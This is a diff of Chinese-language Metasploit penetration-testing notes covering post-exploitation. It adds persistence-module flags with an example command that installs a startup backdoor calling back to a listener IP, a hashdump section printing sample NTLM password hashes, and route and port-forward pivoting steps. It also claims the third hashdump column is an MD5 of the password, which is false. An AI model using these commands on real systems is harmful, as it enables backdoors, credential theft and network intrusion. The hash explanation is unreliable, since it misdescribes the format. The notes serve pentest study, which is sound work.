@@ -150,7 +150,7 @@ msf5 exploit(multi/handler) > run
 ## 持久化
  刚获得`Meterpreter Shell`时，该Shell是极其脆弱的，可以把它和目标机中一个稳定的程序绑定
  
- NT AUTHORITY\SYSTEM 這個帳號通常是隱藏的，就是傳說中的Windows至高無上權限帳號，跟Administrators擁有相同文件權限
+
  
 ```bash
 getpid			#查看当前Meterpreter Shell的进程号
@@ -160,6 +160,12 @@ migrate 476		#将shell迁移到PID为786的进程中
 ## Persistence模块
 ```bash
 run persistence -h    #查看persistence模块帮助信息、参数。
+-X    #在目标系统启动时运行后门。此选项将在 Windows 注册表中添加一个条目，
+      #使后门在系统启动时自动执行。
+-i    #连接尝试的时间间隔
+-p    #lhost的监听端口
+-r    #remote.监听者IP。
+-S    #在目标系统上以系统权限（SYSTEM）运行后门。但是实战中应用此参数报错，原因未知。
 
 #举例
 run persistence -X -i 10 -p 12397 -r 192.168.34.132    
@@ -172,13 +178,20 @@ run persistence -X -i 10 -p 12397 -r 192.168.34.132
 [-] Command shell session 3 is not valid and will be closed 
 [*] 10.100.131.192 - Command shell session 3 closed.
 ```
+关于注册表，有必要提一下HKLM。HKLM是 Windows 操作系统注册表中的一个根键，它代表了 HKEY_LOCAL_MACHINE，其中 "HKEY" 表示 "Handle to a Key"（键的句柄），而 "LOCAL_MACHINE" 表示本地计算机的配置信息。HKLM 包含了计算机的硬件和操作系统的配置信息、安装的软件信息、用户和组的安全设置等等。
 ## 命令摘要
-
 ```bash
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+```
+ NT AUTHORITY\SYSTEM 這個帳號通常是隱藏的，就是傳說中的Windows至高無上權限帳號，跟Administrators擁有相同文件權限
+ 
+```bash
+
+
 pwd、ls、cd
-getuid		#查看当前权限
+
 getsystem	#获得系统管理员权限（要本地管理员权限运行）
-hashdump	#抓哈希密码
 sysinfo		#查看系统信息
 idletim     #查看目标系统已运行时间
 route		#查看目标机完整网络设置
@@ -202,8 +215,14 @@ sudo rdesktop -f 目标IP
 
 route add IP 子网掩码    #添加路由，先background
 ```
-
-
+### Win密码
+```bash
+meterpreter > hashdump    #抓哈希密码，类型为NTLM
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:b9ae0589c85dd1deae5ecdc7e0d3e0e9:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:b9ae0589c85dd1deae5ecdc7e0d3e0e9:::
+jiayuan:1000:aad3b435b51404eeaad3b435b51404ee:e399f145335ed1bd481bf2f030b355ad:::
+```
+第3列是密码md5值
 
 # 网络穿透
 
@@ -222,7 +241,10 @@ meterpreter > run autoroute -p		#列出添加了路由规则的存活session
 
  添加完成后返回上一层，这里一定要保证添加了路由规则的sessions的存活,如果sessions掉了对应的路由规则也就失效了
 
- 添加完成后使用ms17_010的扫描脚本进行目标内网的扫描
+ 添加完成后可以考虑使用ms17_010的扫描脚本进行目标内网的扫描
+
+**端口转发** 
+portfwd
 # 插件
 若要使用get shell提示音，可以使用 sounds plugin.
 # MSF靶机
